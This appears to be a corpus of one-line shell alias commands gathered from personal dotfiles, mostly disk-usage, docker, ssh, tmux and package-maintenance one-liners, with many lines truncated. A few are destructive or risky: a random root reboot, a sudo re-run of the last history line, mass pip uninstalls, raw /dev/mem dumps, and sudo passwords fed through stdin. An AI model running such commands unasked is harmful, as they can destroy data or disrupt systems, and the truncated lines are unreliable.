sudo find / -xdev -type f -size +100M -exec du -sh {} ';' | sort -rh | head -n50
sudo find / -type f -size +50M -exec du -ahx {} \; 2>/dev/null | sort -rh | head -n 10
sudo find / -path /Volumes -prune -o -type f -ls | sort -k 7 -r -n | head -10
sudo find . | cpio -o -Hnewc |gzip -9 >
sudo find . -maxdepth 1 -type d -print | xargs du -sk | sort -rn
sudo find -type f -exec du -Sh {} + | sort -rh | head -10
sudo find -type d -print0 | xargs -0 -I {} chmod 755 {} && sudo find -type f -print0 | xargs -0 -I {} chmod 644 {}
sudo find err.txt generated.file succ.txt -type d -print0 | sudo xargs -0 chmod 0775 && sudo find err.txt generated.file succ.txt -type f -print0 | sudo xargs -0 chmod 0664
sudo emerge --depclean && sudo revdep-rebuild || echo 'Something was wrong'
sudo du -xh --block-size=1024K | sort -nr | head -20
sudo du -xcms err.txt generated.file succ.txt 2>/dev/null | sort -rn | head -11
sudo du -skx err.txt generated.file succ.txt | sort -rn | head
sudo du -sk ./err.txt ./generated.file ./succ.txt | sort -n | awk 'BEGIN{ pref[1]=\
sudo du -sk err.txt generated.file succ.txt | sort -nr | perl -ne
sudo du -sk err.txt generated.file succ.txt | sort -nr | head -10
sudo du -sh err.txt generated.file succ.txt .[A-Za-z0-9]* 2>/dev/null | sort -h | tail -15
sudo du -s err.txt generated.file succ.txt | sort -rn | head
sudo du -k err.txt generated.file succ.txt | awk '$1 > 500000' | sort -nr
sudo du -hsx /bin /boot /dev /etc /evaluation /g /home /lib /lib64 /media /mnt /opt /pash /proc /qsub.log /root /run /sbin /smoosh /srv /sys /tmp /usr /var | sort -rh | head -n 40
sudo du -hsx .[!.]* err.txt generated.file succ.txt | sort -rh | head -6
sudo du -hsx ./err.txt ./generated.file ./succ.txt | sort -rh | head -n 40
sudo du -hsx err.txt generated.file succ.txt | sort -rh | head -10
sudo du -hsx err.txt generated.file succ.txt | sort -rh | head
sudo du -hs err.txt generated.file succ.txt | sort -hr | head -10
sudo du -hs err.txt generated.file succ.txt | sort -rh | head -10
sudo du -hs err.txt generated.file succ.txt | sort -nr | head -10
sudo du -hs && sudo du -ah | sort -r | head -$1
sudo du -hm --max-depth 1 | sort -nr | head
sudo du -ha / | sort -n -r | head -n 10
sudo du -h | sort -r -h | less
sudo du -h / | grep ^[0-9.]*G | sort -rn
sudo du -h -d1 | sort -h | tac
sudo du -h --max-depth=1 | sort -hr | less
sudo du -d 1 -mc |sort -k1 -n -r |less
sudo du -d 1 -h | sort -hr | egrep -v ^0
sudo du -cks err.txt generated.file succ.txt 2> /dev/null | sort -rn | head -11
sudo du -cks err.txt generated.file succ.txt .[^.]* ..?* | sort -rn | head -21
sudo du -chs -BG err.txt generated.file succ.txt .[^.]* ..?* | sort -rn | head -21
sudo du -ah /home | sort -nr | head -n 20
sudo du -ah / 2>/dev/null | sort -n -r | head -n 20
sudo du -ah --max-depth 1 --exclude='proc' | sort -rh | awk '(\$1 > 0){print \$1\
sudo du -ach | sort -h -r | head -$1
sudo du -acSx . | sort -n | tail -n 50
sudo du -aBM -d 1 . | sort -nr | head -20
sudo du -a ~/ | sort -n -r | head -n 10
sudo du -a | sort -n -r | head -n 25
sudo du -a /var | sort -n -r | head -n 10
sudo du -a /home | sort -n -r | head -n 10
sudo du -a /data | sort -n -r | head -n 10
sudo du -a / | sort -nr | head -n 20
sudo du -a / | sort -n -r | head -n 20
sudo du -a / 2>/dev/null | sort -n -r | head -n 50
sudo du -a . | sort -n -r | head -n 10
sudo du -Sh | sort -rh | head -30
sudo du -Sh | sort -rh | head
sudo du --human-readable --one-file-system .|sort --human-numeric-sort --reverse|less
sudo dscacheutil -flushcache || sudo killall -HUP mDNSResponder
sudo dpkg -l |grep ^rc|awk
sudo dpkg -l | sudo awk '/^rc/{print $2}' | sudo xargs dpkg -P
sudo dpkg --purge `dpkg --get-selections | grep deinstall | cut -f1`
sudo dpkg --purge $(dpkg --get-selections | grep deinstall | cut -f 1)
sudo docker.io rmi \$(sudo docker.io images | grep '^<none>' | awk '{print \$3}')
sudo docker volume rm $(docker volume ls -f dangling=true -q) || true
sudo docker rm -f `sudo docker ps|omit-header|pepaste -c 1`
sudo docker ps -l -q | xargs sudo docker kill | xargs sudo docker rm
sudo docker ps -a | cut -c-12 | xargs docker rm
sudo docker ps -a | awk 'NR>1 {print $1}' | xargs docker rm -f
sudo docker images | grep none | tr -s \
sudo docker images | awk 'NR>1 {print $3}' | xargs docker rmi
sudo discoveryutil udnsflushcaches || true"
sudo discoveryutil mdnsflushcache || true &&
sudo discoveryutil mdnsflushcache || sudo killall -HUP mDNSResponder
sudo dd if=/dev/mem | cat | strings
sudo dd if=/dev/disk2 |pv -s 2G | dd of=~/Desktop/raspi.img bs=4096
sudo dd if=$1 | pv | sudo dd of=$2
sudo date -s '$(wget -qSO- --max-redirect=0 bing.com 2>&1 | grep Date: | cut -d' ' -f5-9)'
sudo cpufreq-info 2>&1|grep current|less
sudo cp /etc/hosts.d/custom /etc/hosts && hostfile_switch -d nyc-dev | grep -vi localhost | sudo tee -a /etc/hosts
sudo chown -R zaheen ~/.local/share/Trash && rm -rfv ~/.local/share/Trash/* | lolcat && sudo rm -rfv ~/.cache/thumbnails/* | lolcat
sudo chown -R www-data:www-data .; find -type f |xargs sudo chmod 664; find -type d |xargs sudo chmod 775
sudo chkconfig --list | grep $(runlevel | awk '{ print $2}'):on
sudo cat /var/log/nginx/access.log | ~/kataribe/kataribe -f ~/kataribe/kataribe.toml | less
sudo cat /dev/mem | hexdump -C | less
sudo bleachbit --clean system.cache system.localizations system.trash ; sudo paccache -vrk 3 || return 0
sudo bleachbit --clean system.cache system.localizations system.trash ; sudo paccache -vrk 2 || return 0
sudo bleachbit --clean $(bleachbit --list | grep -v 'free\|memory')
sudo aptitude purge `dpkg --get-selections | grep deinstall | awk '{print $1}'`
sudo apt-get update || sudo apt-get upgrade
sudo apt-get update && yes | sudo apt-get dist-upgrade && yes |sudo apt-get autoremove && notify-send 'Sistema Actualizado'
sudo apt-get purge $(dpkg -l | grep '^rc' | awk '{print $2}')
sudo apt update || sudo apt upgrade -y
sudo apt update | lolcat && sudo apt upgrade | lolcat && sudo snap refresh
sudo apt update | lolcat && sudo apt list --upgradable | lolcat
sudo apt update && msg 列表已经刷新 || msg 刷新失败
sudo amixer set pcm -- $[$amixer get PCM|grep -o [0-9]*%|sed
sudo amixer set Speaker -- $[$(amixer get Speaker|grep -o [0-9]*%|sed
sudo amixer set PCM -- $[$(amixer get PCM|grep -o [0-9]*%|sed
sudo `history | tail -n 1 | cut -d \ -f 3-`
sudo \$(history | tail -n1 | cut --complement -d' ' -f1)
sudo \$(history | tail -1 | awk \
sudo [ $[ $RANDOM % 6 ] = 0 ] && shutdown -r now || echo \
sudo /usr/sbin/lsof -nP | grep TCP | grep LISTEN
sudo /usr/sbin/exim -bp | sudo /usr/sbin/exiqgrep -i | xargs exim -Mrm
sudo /usr/local/sbin/nginx -s stop || true
sudo /usr/bin/docker ps -a | awk '/Exited/ { print \$1 }' | xargs sudo /usr/bin/docker rm
sudo /opt/MegaRAID/MegaCli/MegaCli64 -PDlist -aALL -NoLog|egrep 'Slot|state'
sudo /home/martin/Scripts/create_ap wlp3s0 wwp0s26u1u2i1 Alfa saiakuubik || sudo /sbin/SuSEfirewall2 on
sudo /home/igchor/bin/perf script | ~/Projects/FlameGraph/stackcollapse-perf.pl | ~/Projects/FlameGraph/flamegraph.pl
sudo -S rmmod dvb_usb_rtl28xxu <<< $pass && gqrx || gqrx
sudo -H pip3 list --outdated | cut -d ' ' -f1 | xargs -n1 pip3 install -U
sudo -H pip list --outdated | cut -d ' ' -f1 | xargs -n1 pip install -U
sudo $(tail -2 $HISTFILE | head -1 | cut -d\; -f2-)
sudo $(history | tail -n1 | cut -c 8-)
sudo $(fc -ln | tail -n2 | head -n1)
subl $NOTES_DIR/tasks.txt || echo 'ERROR: Make sure you set NOTES_DIR in .local_config'
subl $(ls ~/Develop/projects | peco | xargs -I % echo ~/Develop/projects/%)
subl $(dirname $(httpd -V | grep -i server_config_file | cut -d '
su -l -c 'screen -x || screen'
stty -a | grep ' erase' | sed 's/.* erase = \(.?*\); .*/\1/'
strip_after_colon | strip_color_codes | uniq
strings /dev/urandom | grep -o '[A-Za-z0-9]' | head
strings .svn/wc.db | grep -e ^http | head -n 1
strings -es < /dev/urandom | head | tr -cd '[[:alnum:]]._-' ; printf '\n'
strace \$@ -p \$(ps -ax | fzf | awk '{print \$2}')
stopos3 || true; startos3
stopDbs || startDbs
stoken | tr -d ''\n'' | pbcopy; scutil --nc start GoDaddy --user tng
startx && vlock || vlock
stack ls dependencies | sed 's/ /-/' | grep \
st | grep deleted | awk '{print $3}'
st | awk '/^[?]/{ print \$2 }' | xargs svn add
st | awk '/^C/{ print \$2 }' | xargs '~/netbeans-7.2/bin/netbeans'
ssie | grep ^? | sed
ssie | grep ^! | sed
sshlist | peco | xargs -I{} sh -c 'ssh {} </dev/tty' ssh
ssh-agent | head -2 | tee ~/.ssh/agent.env ; . ~/.ssh/agent.env ; ssh-add
ssh-agent -k; eval $(ssh-agent| grep -v ^echo| tee $HOME/.ssh/.kc); unalias ssh-setup; ssh-add
ssh-add ~/.ssh/^(*.pub|known_hosts|config)
ssh-add -lK > /dev/null || ssh-add -K && unalias ssh; ssh
ssh-add -l || ssh-add && ssh
ssh-add -l || ssh-add && scp
ssh-add -l || ssh-add && git
ssh-add -l >/dev/null || ssh-addall && unalias ssh; ssh
ssh-add -l >/dev/null || ssh-add ~/.ssh/identities/* && unalias ssh; ssh
ssh-add -l >/dev/null || ssh-add -t $KEY_TIMEOUT; ssh
ssh-add -l >/dev/null || ssh-add && unalias ssh;ssh
ssh-add -l >/dev/null || ssh-add && unalias ssh; ssh
ssh-add -l >/dev/null || ssh-add && unalias git; git
ssh-add -l >/dev/null || ssh-add && alias ssh='ssh -v'; ssh -v
ssh-add -l >/dev/null || ssh-add ${HOME}/.ssh/id_rsa && unalias ssh; ssh
ssh-add -l >/dev/null || ssh-add $SSHADDARGS && unalias ssh; ssh
ssh-add -l > /dev/null || ssh-add && unalias ssh; ssh
ssh-add -l > /dev/null || ssh-add && unalias ssh scp ; ssh
ssh-add -l > /dev/null || ssh-add && unalias ssh ; ssh
ssh-add -l > /dev/null || ssh-add && unalias scp ssh ; scp
ssh-add -l > /dev/null || ssh-add && ssh'
ssh-add -l > /dev/null || ssh-add && TERM=screen-256color ssh
ssh-add -l > /dev/null 2>&1 || ssh-add -t 10800; \ssh
ssh-add -l > /dev/null 2>&1 || ssh-add -t 10800; \scp
ssh-add -l 2> /dev/null || ssh-add ; ssh
ssh-add -L | head -1 | xclip
ssh-add $(cat ~/.ssh-keys.list 2>/dev/null) || ssh-add
ssh thuban || echo 'Must be running f5.sh vpn to succeed'
ssh root@45.55.13.11 -t -- /bin/sh -c 'tmux has-session && exec tmux attach || exec tmux'
ssh menkar || echo 'Must be running f5.sh vpn to succeed'
ssh martin || echo 'Must be running f5.sh vpn to succeed'
ssh josh@zglr.org -t 'tmux attach || tmux new'
ssh josh@192.168.1.2 -t 'tmux attach || tmux new'
ssh johnsAndroid -t 'tmux attach -t john || tmux new -s john'
ssh hongxu@155.69.145.146 -t -- /bin/sh -c 'tmux has-session && exec tmux attach || exec tmux'
ssh grus || echo 'Must be running f5.sh vpn to succeed'
ssh dev -t 'tmux attach -d -t default || tmux new-session -s default'
ssh cs498 -t -- tmux attach || tmux new
ssh bb -t 'tmux attach -d -t default || tmux new-session -s default'
ssh aviation -t 'tmux attach -t john || tmux new -s john'
ssh anvil ps -ef | grep jla; ssh anvil pkill -9 -u jla ; ssh anvil ps -ef | grep jla
ssh angus@angus-server.duckdns.org -t 'tmux attach || tmux'
ssh add -l > /dev/null || ssh-add && unalias ssh ; ssh
ssh acumen || echo 'Must be running f5.sh vpn to succeed'
ssh `find-exo-hosts virt-db-pp|sort|head -1` -L 3308:localhost:3306
ssh `find-exo-hosts portal-db-pp|sort|head -1` -L 3310:localhost:3306
ssh 192.168.2.1 reboot || echo 'Try connecting to the repeater network first.'
ssh 192.168.1.1 reboot || echo 'Try connecting to the main network first.'
ssh -tC lt 'screen -list && screen -Udr || screen -U irssi'
ssh -t sen10 'tmux a -d || tmux new'
ssh -t -- /bin/sh -c 'tmux has-session && exec tmux attach || exec tmux'
ssh -p 443 dev.dolphm.com -t 'tmux att -d || tmux new'
ssh -Y lhcb-asus01 || ssh -YJ lxplus.cern.ch lhcb-asus01
ssh -L 8180:localhost:8180 -L 8181:localhost:8181 -L 8182:localhost:8182 -L 8183:localhost:8183 -L 8184:localhost:8184 -L 8185:localhost:8185 midway | tee /dev/tty | python3 ~/.ssh/run_webbrowser.py
ssh -L 8120:localhost:8120 -L 8121:localhost:8121 -L 8122:localhost:8122 -L 8123:localhost:8123 barhal | tee /dev/tty | python3 ~/.ssh/run_webbrowser.py
ssh $@ -t 'tmux a -t console || tmux new -s console'
ssh $1 -t -- /bin/sh -c 'tmux has-session && exec tmux attach || exec tmux
ss? | 0 | x{0 svn add '{}@'
ss! | 0 | x{0 svn delete '{}@'
ss | grep ? | awk
ss | grep ! | awk
ss | cut -c 9- | xargs gvim
ss | cut -c 9- | xargs ${GEDITOR:-false}
ss -ptunl|egrep -vi unix|fm
ss -ptunl|egrep -vi unix\|-
src=`pwd` && PATH=$PATH:/usr/local/tools/intelFPGA/18.1/modelsim_ase/bin && sim=/tmp/$USER/ds/sim && mkdir -p $sim && cd $sim && vlib myLib && vmap myLib myLib && echo Modelsim initialized and sim folder created && export src || Initialization failed...
squeue | grep tmason1 | wc -l
squeue | grep tmason | wc -l
squeue | grep are | wc -l
squeue | grep 'elk72' | wc -l
squeue | grep $USER | wc -l
squeue | egrep --color '^.*niels.*|$'
squeue -u ksb | grep ksb | wc -l
squeue -p nodes | egrep --color '^.*niels.*|$'
squeue -p gpu-nodes | egrep --color '^.*niels.*|$'
sqlformat --reindent --keywords upper <(xclip -o -sel clip) | sponge | xclip -i -sel clip
sqitch revert --to-change $(tail sqitch.plan -n 2 | head -1 | awk
sq | grep gpu:p40 | grep gpu-
sq | grep gpu:p100 | grep gpu-
spotify status | tr '\n' ' ' | sed -e 's/.*Artist: \(.*\)Album:.*Track: \(.*\)Position:.*/\1- \2/g'
speedtest --server $(speedtest --list | sed -n 4p | cut -c 1-4)
speedometer -rx $(echo $(ls /sys/class/net) | grep -o '\bwl\w*') -tx $(echo $(ls /sys/class/net) | grep -o '\bwl\w*')
specs | xargs grep -sl 'spec_helper' | xargs bundle exec rspec -c
specs | xargs grep -sL 'spec_helper' | xargs bundle exec rspec -c
source ~/aliases.zsh && echo sourced ~/aliases.zsh && [[ -f ~/.local-aliases.zsh ]] && source ~/.local-aliases.zsh && echo sourced ~/.local-aliases.zsh || true
source ~/.zshrc || exec zsh
source ~/.zshrc && fortune | cowthink -f $(find /usr/share/cowsay/cows -type f | shuf -n 1)
source ~/.zshrc && echo 'Profiles reloaded correctly' || echo 'Syntax Errors'
source ~/.zshenv || source ~/.zshrc
source ~/.zshenv && source ~/.zshrc && [[ -f ~/.zshrc_local ]] && source ~/.zshrc_local || true
source virtualenv/bin/activate || source venv/bin/activate
source venv/bin/activate || source bin/activate
source env/bin/activate 2> /dev/null || source ../env/bin/activate
source <(tmux showenv | grep -v '^-' | sed -E 's:^\s*(.*)=(.*)$:export \1=\
source .venv/bin/activate || source venv/bin/activate
source ./.venv/bin/activate || source ./venv/bin/activate
source $ZSHRC && rehash && (test -z $XAUTHORITY || xrdb -merge ~/.Xresources)
source $HOME/.$(ps -p $$ | grep -ioe '\(bash\|zsh\)')rc
source $(find ~/.local/share/oreflags/ -type f | sort| peco )
source $(find $(git rev-parse --show-toplevel 2>/dev/null) -name activate | grep -v hooks | head -1) &> /dev/null
sort| uniq -c| sort -n
sort) <(pacman -Qqg base base-devel|sort) ) | less -S"
sort |uniq -c |sort -n
sort | uniq | wc -l
sort | uniq -c |sort -nr
sort | uniq -c | sort -rnb
sort | uniq -c | sort -rn
sort | uniq -c | sort -r
sort | uniq -c | sort -nr
sort | uniq -c | sort -nk 1
sort | uniq -c | sort -n -r
sort | uniq -c | sort -n
sort | uniq -c | sort -k1 -rn
sort | uniq -c | sort -g
sort | uniq -c | sort
sort | uniq -c | graph
sort | cut -f 1 -d ' ' | sed 's#^\s*##'
sort -r | uniq -c | sort -r
sort -n | uniq -c | sort -n
sort --parallel=6 | uniq -c | sort -n
softwareupdate -i -a; bup;yes | sdk update;yes | sdk upgrade; npm install npm -g; npm update -g; sudo gem update --system; sudo gem update; sudo gem cleanup
snpt ls | fzf | snpt write
snpt ls | fzf | snpt cp
snippet | grep javascript-jasmine.snippets | xargs grep -h '^snippet '
snippet | grep javascript-angular.snippets | xargs grep -h '^snippet '
snippet | grep '/sh.snippets' | xargs grep -h '^snippet '
sleep 5; xwd -root | xwdtopnm | pnmtopng > capture.png
sithaque 'sudo tail -f -n 100 /usr/local/pgsql/data/pg_log/\`sudo ls -tr /usr/local/pgsql/data/pg_log/|tail -n 1\`' |lwatch -i-
sinfo | grep alloc; sinfo | grep mix
sinfo -N --format='%N %1P %t %C' | sed -rn 's-(node[0-9]*) s (mix|idle) [0-9]*/([0-9]*)/[0-9]*/[0-9].*-\\1 \\3-p'
shuf | tr \\n \\0 | xargs -0
shuf -n 1 ~/Dropbox/note/lista-nomi-femminili.txt | tr -d '\n' | tee >(xclip -selection c)
shuf -n 1 /home/james/Dropbox/Documents/Misc/learn/vim/vimtips.txt | cowsay -f $(ls /usr/share/cows | shuf -n 1)
shuf -i 1-49 -n 6 | sort -n | xargs
shopt | grep on | grep -v off
shopt | grep off | grep -v on
shopt -q login_shell && echo 'True' || echo 'False'
shell-fm || rm -f ~/Tmp/shell-fm.np && echo \
shasum -a 256 err.txt generated.file succ.txt | awk '{print $1}' | sort -u
sh /sdcard/arch/bootscript.sh || sh /sdcard/arch/bootscript-fix.sh
sh -c 'rm app/assets/webpack/* || true && cd client && bundle exec rake react_on_rails:locale && yarn run build:development'
sh -c 'cat /dev/urandom | env LC_CTYPE=C tr -dc a-zA-Z0-9 | head -c 100'
sgrep --exclude=configure --exclude=libtool --exclude=depcomp --exclude=config.status --exclude=Makefile.in -E 'FIXME|TODO|XXX'
setxkbmap dvorak || loadkeys dvorak
setxkbmap de nodeadkeys || loadkeys de-latin1-nodeadkeys
setfont \$(ls /usr/share/kbd/consolefonts | cut -d . -f1 | fzf)
set | sort | grep -i
set | grep '^COLOR_' | sort
set | g = | gv '^\s'
set | egrep '^COLOR_\w*' | sort
set -ex | vagrant destroy && rm -rf ~/.ssh/known_hosts && vagrant up | set +ex
services 2>&1 | grep '\[ . \]' | awk '{print \$4}' ; initctl list
service httpd stop || /etc/init.d/httpd stop
service httpd start || /etc/init.d/httpd start
service httpd restart || /etc/init.d/httpd restart
service httpd reload || /etc/init.d/httpd reload
seq 20 | xargs -Iz echo 'dum' | say -v Bad
seq -f '4/%g' 1 2 99999 | paste -sd-+ | bc -l
sensors|grep RPM|cut -d' ' -f5-6
sensors | grep crit | sed -r 's/[^ ]+\ +([^ ]+).*/\1/'
sensors | grep Package ; sensors | grep Core
sensors | egrep -i --color 'core |temp[1-9]'
sensors | awk '/^temp1:/ {print $2}' | tail -n 1
sensors 'uname -a; top -bn1|head -4;df -h .|tail -1; '
sed''|perl -ne '\$a[\$n++]=\$_;if(eof){for(@a){print}}'|sed''
sed -i .bak -E '/^(159|116|88)/d' ~/.ssh/known_hosts
sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | xargs sudo $apt_pref install
sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 |
sed -e ""s/\s\\\\$//"" | sed -e ""s/^ //"" |\
sed -d /\/\w+[.]?\w*$ | sort | uniq
sed -E 's~ ([^ |]+)([ |])+(.+)~\1:0:0 \3~'
sed 's/─//g' | sed 's/ //g' | sed 's/ / /g'
sed 's/|/\n/g' ~/.bash_history | awk '{CMD[\$1]++;count++;}END { for (a in CMD)print CMD[a] \
sed 's/column=/\n |---->COLUMN = /g' | \
sed 's/\(.*\)\..*/\1/' | sort | uniq -d"
sed 's/ native=\(true\|false\), / /g' | \
sed ':x s/\(^\|\t\)\t/\1 \t/; t x' | column -ts$'\t'
sed '/connecting to: mongodb:\/\/\|MongoDB server version: 0.0.0\|setting random seed:/d'
sed '/^$/d' < mpa_sqltables.groovy | grep -v '//'|wc
searchnotes .|fzy -l 25|open_in_app
searchnotes -m 5 .|fzy -l 25|open_in_app
scutil --nc start GoDaddy --user tng; stoken | tr -d '\n' | pbcopy
script/server || script/dev
script/server 2> /dev/null ||rails server
script/console 2> /dev/null ||rails console
screenresolution set 2880x1800x32@0 || screenresolution set 2560x1600x32@0
screen -x || screen -U
screen -x || screen
screen -x stb-console || screen -S stb-console /dev/tty.usbserial 115200
screen -x stb-console || screen -S stb-console /dev/cu.usbserial-A6007Jmx 115200
screen -x stb-console || screen -S stb-console /dev/cu.SLAB_USBtoUART 115200
screen -x &> /dev/null || screen
screen -rd || screen
screen -r || screen
screen -r main || screen -r
screen -r -d right || screen -S right
screen -r -d lefttop || screen -S lefttop
screen -r -d leftbot || screen -S leftbot
screen -r -d irc || screen -S irc irssi
screen -q -r -D vim || screen -S vim $(which vim)
screen -q -r -D cmus || screen -d -m -S cmus $(which cmus)
screen -q -r -D cmus || screen -S cmus /bin/cmus
screen -q -r -D cmus || screen -S cmus $(which cmus)
screen -q -r -D cmus || screen -S cmus $(whereis cmus)
screen -ls | awk -F '.' '/pts/{print \$1}' | xargs -r kill
screen -ls | awk -F '.' '/Detached/{print \$1}' | xargs -r kill
screen -dr || screen -e^\\\\a
screen -dr || screen
screen -dr normaltask || screen -S normaltask
screen -d -r all||screen -S all
screen -U -dr main || screen -U -S main
screen -S jupyter -Q select . || screen -dmS jupyter jupyter notebook --notebook-dir=${HOME}/src/personal/carnd
screen -Rdx prompt || screen -U -S prompt
screen -R weechat || screen -S weechat weechat
screen -D -R `screen -ls | grep Krish | cut -c -13`
say 'command complete' || say 'command failed'
sar -u|head -3 ; sar -u|tail -30
sar -q|head -3 ; sar -q|tail -30
sanquery -c 'porterrshow' --skip ' 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0' -a | egrep -v 'c3timeout|g_eof'
sacctmgr -p show associations user=$USER | tr '|' '\t'
rvm use ruby-1.8.7-p374 && make_review --no-i18n --no-publish && rvm use . || ruse
rvm use \$(rvm list strings | grep -i rbx | tail -1)
rvm use \$(rvm list strings | grep -i macruby | tail -1)
rvm use \$(rvm list strings | grep -i jruby | tail -1)
rvm use \$(rvm list strings | grep -i 2.0 | tail -1)
rvm use \$(rvm list strings | grep -i 1.9.3 | tail -1)
rvm use \$(rvm list strings | grep -i 1.9.2-p180 | tail -1)
rvm use \$(rvm list strings | grep -i 1.9.2 | tail -1)
rvm use \$(rvm list strings | grep -i 1.9.1 | tail -1)
rvm use \$(rvm list strings | grep -i 1.8.7 | tail -1)
rvm use \$(rvm list strings | grep -i 1.8.6 | tail -1)
run_cmd docker ps; run_cmd docker logs -f $(docker ps|sed 1d|awk
rubycritic -f console && sandi_meter -d || true && rails_best_practices
ruby -r rdoc -e 'puts RDoc::Markup::ToMarkdown.new.convert File.read(ARGV[0] || \
ruby -e 'loop { 0.upto(50) { |i| print \
ruby -e 'from=ARGV.shift; to=ARGV.shift; r={}; ARGV.map{|x| Thread.start{ r[%Q!# #{x}!] = IO.popen(%Q!scp -r #{from} #{x}:\
ruby -e 'cmd=ARGV.shift; r={}; ARGV.map{|x| Thread.start{ r[%Q!# #{x}!] = IO.popen(%Q!ssh -t #{x} \
ruby -e '(1..1000).each {|i| sleep i/1000.0; print \
ruby -S update.rb || pacman -Qu
rsync -avP hankinsj@$PURDUE_MACHINE:/homes/hankinsj/CS/`pwd | rev | cut -d
rsync -avP ./ hankinsj@$PURDUE_MACHINE:/homes/hankinsj/CS/`pwd | rev | cut -d
rskill || message && python dowant/manage.py runserver 0.0.0.0:8000 --settings=dowant.dev_settings
rs '^<<<<<<|^=======$|^>>>>>>>'
rpm -qa | sort | grep -i
rpm -qa kernel |sort -V |tail -n 1
rpm -qa --queryformat '%{installtime} %{installtime:date}\t%{name}-%{version}-%{release}\n' | sort -nr +1 | sed -e 's/^[^ ]* //'
route | grep '^default' | grep -o '[^ ]*$'
route -n | grep ^0.0.0.0 | awk '{print $2}'
route -n | grep 'UG' | awk '{ print \$2 }'
route -n get default | sed -n 4p | cut -c14-
route -n get default | grep gateway | sed 's~[^0-9]*\([0-9]*\.[0-9]*\.[0-9]*\.[0-9]\)$~\1~'
rostopic list | sort -u | grep
rosnode list | grep -v rosout | xargs rosnode kill
rmtrash || alias rm='rm -i'
rmMvn && whipeout && sTest && notify-send 'magic performed' || notify-send 'probably a network problem'
rm ~/Downloads/appvideo.mov || xcrun simctl io booted recordVideo ~/Downloads/appvideo.mov
rm ~/.gituser || true && ln -s ~/.dots/git/gituser_work ~/.gituser
rm ~/.gituser || true && ln -s ~/.dots/git/gituser_home ~/.gituser
rm `ls *gem` || true && gem build `ls *gemspec` && gem install `ls *gem`
rm \`svn st|grep -v ^?|cut -c2-\`
rm -rf ~/.idm/uex/*.*|rm -rf ~/.idm/uex/.dat |/usr/local/bin/uex &
rm -f (.*~|*~|\#*)
rm -f $(svn status | grep [^?] | awk '{print $2}')
rm *.log | rm *.aux | rm *.toc
rm *.class; javac *.java 2>&1 | grep -C 5 .java | grep -C 5 [0-9]
rm $(snakemake --summary | tail -n+2 | cut -f1)
rlwrap ocaml || ocaml
rlwrap node-repl || node-repl
rlog RCS/* | egrep -e 'Working file:|head:'
rg -e 'status.*failed' -e 'status.*error' target/cucumber_results_html/*/report.js --files-with-matches |awk -F/ '{print \$3}' |xargs -I {} open target/cucumber_results_html/{}/index.html
rg --hidden --follow --glob '!.(git|hg|svn)' -e 'TODO\(kyle\)'
rg --files -tasm -tc -tcpp | sort | uniq > project.files
rg '# (TODO|FIXME|XXX)'
rfkill block $(rfkill list | grep bluetooth | cut -c 1)
rfkill block $(rfkill list | grep WAN | cut -c 1)
rev | sort | rev
rev | awk1 | rev
return 1 2>/dev/null || exit 1
return 0 2>/dev/null || exit 0
reset;clear_console || clear;set +o nounset
repocmd git status | cleanStatus | grep :
repo branch . || repo branch
remote-host --format=csv --field-labels=0) || exitDeploy
remind -p ~/Dokumente/Remind/.reminders| rem2ps > remind.ps | lpr remind.ps
remind -n -g -q ~/.reminders | grep -ve '-[0-9][0-9]*h[0-9][0-9]*m$' | sort
ref=$(git symbolic-ref HEAD 2> /dev/null) || return; git log -1 --pretty=format:\
reboot || sudo reboot > /dev/null 2>&1
read test_variable || true
read -s PASS; echo $PASS | sha256sum | hex2ascii; echo
read -s PASS; echo $PASS | sha256sum | hex2ascii
rbenv install -l | selecta | xargs rbenv install
rbenv install -l | grep -v - | tail -1
random_alias | cowthink | lolcat
random-64k | sha512sum | cut -d' ' -f1
random-64k | sha256sum | cut -d' ' -f1
random-64k | sha1sum | cut -d' ' -f1
random-64k | md5sum | cut -d' ' -f1
rake db:abort_if_pending_migrations || (rake db:migrate && RAILS_ENV=test rake db:schema:load)
rake console 2>/dev/null || rails c 2>/dev/null
rake \`rake -T | selecta | cut -f2 -d' '\`
rake && cuke && rake jasmine:ci && say 'derp' || say 'fail'
rails_routes | fzf | pbcopy
rails test || bundle exec rails test
rails server || bundle exec rails server
rails s -b 0.0.0.0 | grep -vE '(^$|asset)'
rails runner 'Sidekiq.redis { |conn| conn.flushdb }'
rails runner 'Resque.queues.each{|q| Resque.redis.del \
rails rake apartment:rollback || rails rake db:rollback
rails rake apartment:migrate || rails rake db:migrate
rails db:migrate || rake db:migrate
rails console || bundle exec rails console
railroad $* -M | dot -Tsvg | sed 's/font-size:14.00/font-size:11.00/g'
railroad $* -C | neato -Tsvg | sed 's/font-size:14.00/font-size:11.00/g'
radirs | grep -v '/\.' | sed -e 's/^..//'
rabbitmqadmin list queues|awk 'NR>3{print \$2}'|xargs -I qname rabbitmqadmin delete queue name=qname
r=$(cat /dev/urandom |tr -dc abcdefghknopqrstuvwxyzCDEY379 |head -c12); echo ${r:0:4}-${r:4:4}-${r:8:4}
r | xclip -i -sel p -f | xclip -i -sel c
r -lnr | grep -v '^prevcmd' | head -1
quj | grep '^Job\|Job_Name'
quit||exit
qstat |cut -d ' ' -f1 |xargs qdel
qstat | sed 's/^/ /' | tail -n `tput lines`
qstat | grep veryshort | tee >(wc -l)
qstat | grep junoq | grep lidj
qstat | grep gkumar | awk '{if (\$5 == \
qstat | grep dybshortq | grep lidj
qstat | grep dyb64q | grep lidj
qstat | grep alexis | wc -l
qstat | grep [^very]short | tee >(wc -l)
qstat -u tm3124 | grep tm3124 | wc -l
qstat -u $USER | grep qw | wc
qstat -u $USER | grep ' r ' | wc
qn | grep free | wc -l
qdbus | sed '/^:/d;s/ //' | sort
python3 || python2
python3 -m pip install -U pip && pip3 list --outdated --format=legacy | cut -d' ' -f1 | grep -ivF \
python3 -m pip freeze | perl -pe 's/==.+//g' | xargs -n1 sudo -H python3 -m pip uninstall -y
python3 -m pip freeze --local | sed '/^-e/d;s/=.*//' | xargs -n1 python3 -m pip install --upgrade
python3 -m http.server || python2 -m SimpleHTTPServer
python3 -m IPython || python3
python2 -m pip freeze --local | sed '/^-e/d;s/=.*//' | xargs -n1 python2 -m pip install --upgrade
python ~/scripts/mojo_im.py qq printt | tail -7 | head -5
python ~/GitHub/py-demo/tools/getIp.py|pbcopy|pbpaste
python ~/.piplist.py | cut -d = -f1 | xargs -n1 pip install -qU
python -q 2> $NUL || python
python -mjson.tool|pygmentize -l javascript|less -R
